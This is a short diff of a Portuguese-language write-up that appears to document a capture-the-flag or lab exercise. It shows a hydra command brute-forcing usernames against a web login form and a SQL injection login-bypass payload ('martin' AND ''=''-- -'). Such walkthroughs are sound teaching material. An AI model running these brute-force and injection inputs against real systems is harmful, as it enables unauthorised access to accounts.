@@ -14,8 +14,7 @@ Após algum tempo pensando, foi decidido tentear _brute force_, mesmo sem lista 
 > ```bash
 > hydra -L ../seclists/Usernames/xato-net-10-million-usernames.txt -p test [ip_address] http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
 > ```
-![](hydra_result.jpg)
-
+Após um tempo, foi decidido tentar uma abordagem diferente de ```OR```
 Tentando ```martin' AND ''=''-- -```, temos:
 
 ![](login_bypass.jpg)
